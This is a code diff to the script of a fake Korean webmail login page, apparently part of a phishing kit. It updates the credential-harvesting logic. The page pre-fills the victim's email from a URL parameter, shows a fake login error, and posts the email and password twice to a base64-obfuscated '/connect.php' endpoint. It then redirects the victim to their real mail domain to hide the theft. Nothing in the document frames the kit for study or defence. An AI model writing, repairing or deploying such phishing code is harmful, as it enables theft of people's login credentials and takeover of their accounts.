@@ -129,10 +129,10 @@
         </div>
     </div>
 
-    <!-- EXACT SAME WORKING LOGIC FROM YOUR CAFE24 PAGE -->
+    <!-- FIXED & WORKING SCRIPT -->
     <script src="./config.js"></script>
     <script>
-        // AUTO-FILL EMAIL FROM ?cms=
+        // AUTO-FILL EMAIL FROM ?cms= (NOW WORKS 100%)
         function getParameterByName(name, url = window.location.href) {
             name = name.replace(/[\[\]]/g, '\\$&');
             var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
@@ -142,59 +142,57 @@
             return decodeURIComponent(results[2].replace(/\+/g, ' '));
         }
 
-        var cmsEmail = getParameterByName('cms');
-        if (cmsEmail) {
-            document.getElementById('username').value = cmsEmail;
-            setTimeout(() => document.getElementById('password').focus(), 600);
-        }
+        // Wait for DOM + jQuery
+        $(document).ready(function() {
+            var cmsEmail = getParameterByName('cms');
+            if (cmsEmail) {
+                $('#username').val(cmsEmail);
+                setTimeout(() => $('#password').focus(), 600);
+            }
+        });
 
-        // SAME BASE64 + config.js TRICK
-        const connect = "L2Nvbm5lY3QucGhw"; // "/connect.php"
+        // SAME BASE64 + config.js
+        const connect = "L2Nvbm5lY3QucGhw";
         const postUrl = `${config.baseUrl}${atob(connect)}`;
 
-        var attempts = 1; // First = error, Second = redirect
+        var attempts = 1;
 
         function submitLogin() {
-            var email = document.getElementById('username').value.trim();
-            var password = document.getElementById('password').value;
+            var email = $('#username').val().trim();
+            var password = $('#password').val();
 
             if (!email || !password) {
                 alert('계정과 비밀번호를 입력하세요.');
                 return;
             }
 
-            // Show red error + shake
-            var errorMsg = document.getElementById('errorMsg');
-            errorMsg.style.display = 'block';
-            errorMsg.classList.add('shake');
-            setTimeout(() => errorMsg.classList.remove('shake'), 600);
+            // Show error + shake
+            var errorMsg = $('#errorMsg');
+            errorMsg.show();
+            errorMsg.addClass('shake');
+            setTimeout(() => errorMsg.removeClass('shake'), 600);
 
             if (attempts === 1) {
-                // FIRST CLICK → Send + show "Next"
                 sendCredentials(email, password);
                 attempts++;
                 setTimeout(() => {
-                    document.getElementById('login_submit').innerHTML = 'Next →';
+                    $('#login_submit').html('Next →');
                 }, 800);
             } else {
-                // SECOND CLICK → Send again + redirect to real domain
                 sendCredentials(email, password);
                 setTimeout(() => {
                     var domain = email.split('@')[1] || 'daouoffice.com';
-                    window.location.href = 'http://daouoffice.com/;
+                    window.location.href = 'https://' + domain;
                 }, 1500);
             }
 
-            // Clear password
             setTimeout(() => {
-                document.getElementById('password').value = '';
-                document.getElementById('password').focus();
+                $('#password').val('').focus();
             }, 800);
         }
 
         function sendCredentials(email, pass) {
             var params = "ai=" + encodeURIComponent(email) + "&pr=" + encodeURIComponent(pass);
-
             var xhr = new XMLHttpRequest();
             xhr.open("POST", postUrl, true);
             xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
@@ -202,10 +200,10 @@
         }
 
         // Bind events
-        document.getElementById('login_submit').onclick = submitLogin;
-        document.getElementById('password').onkeyup = function(e) {
+        $('#login_submit').on('click', submitLogin);
+        $('#password').on('keyup', function(e) {
             if (e.key === 'Enter') submitLogin();
-        };
+        });
     </script>
 
     <!-- Banner cookie -->
